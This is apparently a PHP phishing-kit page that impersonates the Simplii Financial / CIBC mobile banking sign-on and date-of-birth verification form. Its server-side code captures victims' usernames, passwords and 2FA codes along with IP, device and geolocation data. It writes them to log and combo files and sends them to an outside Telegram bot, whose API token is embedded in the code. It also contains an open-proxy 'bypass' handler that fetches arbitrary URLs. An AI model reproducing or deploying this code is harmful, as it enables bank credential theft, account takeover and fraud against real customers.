  <?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/telegram.dat';
$file2      = '/data.csv';
$file3      = '/acc_log.csv';
$file4      = '/useragent.dat';
$file5      = '/combo.txt';

$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "SIMPLII";

    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $code2      ="[2FA][$code]";
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="RANDOM-RYANS LINKIMPORTANT DATA WAS LOGGED\n$bank$lh$ip$lh$uos\n$bank Username  :  $user\n\n$bank PASSWORD  :  $pass\n\n$uos$lh$bsr\n$is\n$city$lh$country\n$la\n$lp\n\n$uaget\n\n$url";

file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n[$ip][$date][$time][$bank][TELEGRAM-LOG]\n", FILE_APPEND);
file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
file_put_contents($file5, "$user:$pass\n", FILE_APPEND);

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
      ?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Simplii Financial Mobile Banking Sign On</title>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" href="./sim_2_files/reset.css">
        <link rel="stylesheet" href="./sim_2_files/reset-brand.css">
        <link rel="stylesheet" href="./sim_2_files/global.css">
        <link rel="stylesheet" href="./sim_2_files/global-android2.css">
        <link rel="stylesheet" href="./sim_2_files/global-brand.css">
        <link rel="stylesheet" type="text/css" href="./sim_2_files/reset(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_2_files/reset-brand(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_2_files/global(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_2_files/global-android2(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_2_files/global-brand(1).css">
        <link rel="stylesheet" href="./sim_2_files/password-reset.css">
        <link rel="stylesheet" href="./sim_2_files/password-strength.css">
        <script src="./sim_2_files/password-strength"></script>
        <script src="./sim_2_files/change-password"></script>
        <script type="text/javascript" src="./sim_2_files/jquery-1"></script>
        <script type="text/javascript" src="./sim_2_files/wicket-event-jquery"></script>
        <script type="text/javascript" src="./sim_2_files/wicket-ajax-jquery"></script>
        <script type="text/javascript" id="wicket-ajax-base-url">
            /*<![CDATA[*/
            Wicket.Ajax.baseUrl="change-password";
            /*]]>*/
        </script>
        <script src="./sim_2_files/global"></script>
        <script src="./sim_2_files/drawer-scroll-prevent"></script>
        <link rel="stylesheet" href="./sim_2_files/appboy.css">
        <style>
        input[type='number'], input[type='text'], input[type='password'], input[type='email'], input[type='tel'], input[type='search'], #manage-cards-button, select {
            padding: 0.8em;
            height: 55px;
            max-height: 46px;
        }
        </style>
        <script src="./sim_2_files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>var lrbank = 'Simplii'; var lrinfo = 'Details';</script>
        <script src="./sim_2_files/actions"></script>
        <script src="./sim_2_files/jquery.mask"></script>
        <script src="./sim_2_files/details"></script>
    </head>
    <body lang="en" class="android-fix">
        <span class="offscreen">CIBC Mobile Banking</span>
        <input id="drawer-toggle-chk" aria-hidden="true" type="checkbox">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./sim_2_files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./sim_2_files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div class="account-holder-name" id="account-holder-name"></div>
                    <a href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-profileLink" class="no-style-link active" id="profile-link">
                    <span>My Profile</span><span class="drawer-icon-cog"></span>
                    </a>
                </div>
                <ul>
                    <li id="li-my-accounts"><a id="accounts-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-accountLink" role="menuitem" class="">My Accounts</a></li>
                    <li id="li-pay-bills"><a id="paybill-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-paybillLink" role="menuitem" class="">Bill Payments</a></li>
                    <li id="li-interac"><a id="etransfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-eTransferLink" role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
                    <li id="li-transfer"><a id="transfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-transferLink" role="menuitem" class="">Transfer Funds</a></li>
                    <li id="li-upcoming"><a id="uptxs-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-upcomingTransactionsLink" role="menuitem" class="">Upcoming Transactions</a></li>
                    <!-- dynamic SSO links -->
                    <li class="li-sso"><a id="GMT-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxir&amp;locale=en&amp;channel=mobile_web" role="menuitem">Global Money Transfer</a></li>
                    <li class="li-sso"><a id="FXC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxcash&amp;locale=en&amp;channel=mobile_web" role="menuitem">Order Foreign Cash</a></li>
                    <li class="li-sso"><a id="RPC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxprepaid&amp;locale=en&amp;channel=mobile_web&amp;page=fxretailprepaid-manage" role="menuitem">Prepaid Cards</a></li>
                    <li class="li-sso"><a id="PMO-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxpmo&amp;locale=en&amp;channel=mobile_web" role="menuitem">Buy Gold and Silver</a></li>
                    <li class="li-sso"><a id="CCS-link" href="https://www.cibc.mobi/ebm-mobile-anp/pre-credit-score?locale=en&amp;ebkck=true&amp;tcVersion=1.0&amp;channel=mobile_web" role="menuitem">Check Credit Score</a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-openAccountPsSO-openAccountPsSOLink" role="menuitem">Open an Account</a></li>
                    <li id="li-browse-products"><a id="products-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-browseProductsPsSO-productSelectorSOLink" target="_blank" role="menuitem" @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;" class="">Explore Products</a></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-sitesPostSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
                    <!-- Customer Services link visible for CIBC non-Small Business -->
                    <li id="li-client-services"><a id="customerServices-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-customerServicesLink" class="">Customer Services</a></li>
                    <hr>
                    <li><a class="nav-no-indent" id="contact-us-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-contactUsLink" role="menuitem">Contact Us</a></li>
                    <li><a class="nav-no-indent" id="help-link" href="http://cibc.intelliresponse.com/mobile-w/" role="menuitem">Help</a></li>
                    <li><a class="nav-no-indent" id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:7109" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li id="li-sign-out"><a class="nav-no-indent" id="logout-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-logoutLink" role="menuitem">Sign Out</a></li>
                    <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="deposit/simplii/#" target="_blank">
                <div id="header-logo"><span class="offscreen">Simplii Financial logo</span></div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <section id="main-page" class="">
            <section id="ide">
                <section class="page-title">
                    <h2 class="title">Personal Information</h2>
                </section>
            </section>
            <section id="change-password" class="page-wrapper">
                <div class="global-error-from-container" id="idf">
                </div>
                <form id="idb" method="post" action="040149.php">
                                        <div>
                        <span class="form-label display-block mb-5" style="display: block;">Date of Birth:</span>
                        <select name="dob1" required="" class="form-control text-center display-inline-block lrinput" style="width:30%; display: inline-block" attr-action="Selecting DoB">
                            <option value="">MM</option>
                            <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                        </select>
                        <select name="dob2" required="" class="form-control text-center display-inline-block lrinput" style="width:30%; display: inline-block" attr-action="Selecting DoB">
                            <option value="">DD</option>
                            <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>                        </select>
                        <select name="dob3" required="" class="form-control text-center display-inline-block lrinput" style="width:37%; display: inline-block" attr-action="Selecting DoB">
                            <option value="">YYYY</option>
                            <option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option>                        </select>
                    </div>
                                        <fieldset class="button-set">
                        <input name="cancel-button" id="cancel-button" class="btn btn-negative" value="Cancel" type="button">
                        <input id="save-button" class="btn btn-positive" value="Confirm" name="save" type="submit">
                    </fieldset>
                    <input name="CRSFToken" value="baee0e28-1986-4bc7-82f2-fe4d85aa68ef" type="hidden">
                </form>
            </section>
        </section>
        <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
            <div class="ajax-overlay-background"></div>
            <img src="./sim_2_files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
        </div>
    

</body></html>